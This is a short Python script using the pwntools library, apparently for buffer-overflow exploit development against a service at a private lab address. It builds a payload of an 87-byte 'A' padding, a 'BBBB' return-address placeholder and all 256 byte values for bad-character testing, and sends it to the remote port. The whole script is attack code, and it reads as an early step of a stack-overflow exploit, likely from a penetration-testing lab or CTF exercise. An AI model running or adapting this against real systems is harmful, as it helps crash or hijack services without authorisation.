from pwn import *

offset = 87

# generate bytes 0x00 -> 0xff
badchars = bytes(range(0, 256))

payload = b'A' * offset
payload += b'BBBB'
payload += badchars

p = remote('10.10.16.36', 10100)

p.sendline(payload)
